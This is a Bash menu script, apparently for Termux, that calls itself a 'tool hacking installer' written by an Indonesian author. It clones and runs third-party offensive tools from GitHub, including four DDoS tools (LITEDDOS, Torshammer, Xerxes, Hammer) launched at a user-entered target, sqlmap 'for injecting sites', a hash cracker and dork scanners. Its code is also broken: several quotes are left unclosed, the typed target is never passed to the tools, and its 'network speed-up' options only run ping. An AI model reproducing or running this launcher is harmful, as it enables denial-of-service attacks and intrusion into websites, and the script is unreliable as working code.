#!/system/xbin/bash
#Author Bahauddin
#
#
#

clear
blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'                                           
yellow='\033[33;1m'
NOW=`date "+%d.%m.%Y"`
TIME=`date "+%H:%M"`

echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
echo ""
echo $white".:WELCOME TO MY TOOL HACKING BRO.............HAPPY HACKING:."
echo $purple"...........::::::::::Bahauddin Mr.B4h4'::::::::::..........."
echo $cyan".::Bermimpi lah Setinggi Langit Karena Mimpi itu Gratis:.."
echo $green"......::::::MONGGO DI Pilih Tools Yang Tersedia:::::::......"
echo $yellow
date 
echo "\033[36;1m"
echo "[+]===============================================[+]"
echo $red"|  [1] Materi Hacking Ala InYourDfv47               |"
echo "[+]===============================================[+]"
echo $white"|  [2] DDOS Website Dengan LITEDDOS                 |"
echo "[+]===============================================[+]"
echo $purple"|  [3] DDOS Website Dengan Torshammer               |"
echo "[+]===============================================[+]"
echo $cyan"|  [4] DDOS Website Dengan Xerxes                   |"
echo "[+]===============================================[+]"
echo $green"|  [5] DDOS Website Dengan Hammer                   |"
echo "[+]===============================================[+]"
echo $yellow"|  [6] Mempercepat / Menstabilkan Sinyal 1          |"
echo "[+]===============================================[+]"
echo $red"|  [7] Mempercepat / Menstabilkan Sinyal 2          |"
echo "[+]===============================================[+]"
echo $white"|  [8] Install Red_Hawk                             |"
echo "[+]===============================================[+]"
echo $purple"|  [9] Instal Txtool                                |"
echo "[+]===============================================[+]"
echo $cyan"|  [10] Install Sqlmap Buat Inject Situs            |"
echo "[+]===============================================[+]"
echo $green"|  [11] Install Hash-buster                         |"
echo "[+]===============================================[+]"
echo $yellow"|  [12] Install  Hunner Framework                   |"
echo "[+]===============================================[+]"
echo $red"|  [13] Lihat Spesifikasi Ponsel                    |"
echo "[+]===============================================[+]"
echo $white"|  [14] Install Ko-Dork                             |"
echo "[+]===============================================[+]"
echo $purple"|  [15] Install 4wsectools                          |"
echo "[+]===============================================[+]"
echo $cyan"|  [16] Install BinGoo                              |"
echo "[+]===============================================[+]"
echo $green"|  [17] Install GadoGado                            |"
echo "[+]===============================================[+]"
echo
echo "\033[32;1m"
read -p "╭─>[Pilih Nomer]
╰─>root@Bahauddin=•>" bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Learn Hack..."
sleep 1
git clone https://github.com/Dfv47/learn
mv learn $HOME
cd $HOME/learn
sh learn.sh
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing LITEDDOS..."
sleep 1
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
echo
toilet -f standard " Bahauddin" -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Torshammer DDOS..."
sleep 1
apt update
apt install git
apt install tor
git clone https://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer
read -p "Masukan Target:" target
python2 torshammer.py -T -t target
fi

if [ $bro = 4 ] || [ $bro = 4 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
echo $green"Installing Xerxes DDOS..."
sleep 1
apt update && apt upgrade
apt install git
apt install clang
git clone https://github.com/zanyarjamal/xerxes
mv xerxes $HOME
cd $HOME/xerxes
clang xerxes.c -o xerxes
clear
read -p "[masukanWebsiteTarget]>" target
./xerxes target 80
fi

if [ $bro = 5 ] || [ $bro = 5 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green" Installing Hammer DDOS.."
sleep 1
git clone https://github.com/cyweb/hammer
mv hammer $HOME
cd $HOME/hammer
read -p "Masukan Target:" target
python2 hammer.py -T -t target
fi

if [ $bro = 6 ] || [ $bro = 6 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Jaringan Dipercepat..."
echo ""
echo ""
ping 8.8.8.8 
fi

if [ $bro = 7 ] || [ $bro = 7 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Jaringan Dipercepat..."
echo ""
echo ""
ping -D www.google.com
fi

if [ $bro = 8 ] || [ $bro = 8 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Red Hawk..."
sleep 1
apt update
apt install git
apt install php
git clone https://github.com/Tuhinshubhra/RED_HAWK
mv RED_HAWK $HOME
cd $HOME/RED_HAWK
chmod +x rhawk.php
php rhawk.php
fi

if [ $bro = 9 ] || [ $bro = 9 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Txtool..."
sleep 1
git clone https://github.com/kuburan/txtool
mv txtool $HOME
cd $HOME/txtool
python2 install.py
python2 update.py
txtool
fi

if [ $bro = 10 ] || [ $bro = 10 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Sqlmap..."
sleep 1
apt update
apt install git
git clone https://github.com/sqlmapproject/sqlmap
mv sqlmap $HOME
cd $HOME/sqlmap
read -p "masukan web target:" target
python2 sqlmap.py -D target
fi

if [ $bro = 11 ] || [ $bro = 11 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Hash-buster..."
sleep 1
apt upgrade
apt install python2
apt install git
git clone https://github.com/UltimateHackers/Hash-Buster
mv Hash-Buster $HOME
cd $HOME/Hash-Buster
python2 hash.py
fi

if [ $bro = 12  || [ $bro = 12 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Hunner Framework..."
sleep 1
apt update
apt install git
git clone https://github.com/b3-v3r/Hunner.git
mv Hunner $HOME
cd $HOME/Hunner
chmod +x hunner.py
python2 hunner.py
fi

if [ $bro = 13 ] || [ $bro = 13 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Loading Tod:v..."
sleep 1
pkg install neofetech
neofetech
fi

if [ $bro = 14 ] || [ $bro = 14 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Ko-Dork..."
sleep 1
pkg update && pkg upgrade
pkg install git 
pkg install python2
git clone https://github.com/ciku370/ko-dork.git
mv ko-dork $HOME
cd $HOME/ko-dork
python2 dork.py
fi

if [ $bro = 15 ] || [ $bro = 15 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing 4wsectools..."
sleep 1
apt update
apt install git
git clone https://github.com/aryanrtm/4wsectools
mv 4wsectools $HOME
cd $HOME/4wsectools
chmod 777 tools
./tools
fi

if [ $bro = 16 ] || [ $bro = 16 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing BinGoo..."
sleep 1
git clone https://github.com/Hood3dRob1n/BinGoo
mv BinGoo $HOME
cd $HOME/BinGoo
bash bingoo
fi

if [ $bro = 17 ] || [ $bro = 17 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing GadoGado..."
sleep 1
apt update && apt upgrade
apt install ruby
apt install lolcat
apt install git
git clone https://github.com/Senitopeng/GadoGado.git
mv GadoGado $HOME
cd $HOME/GadoGado
bash gado
fi


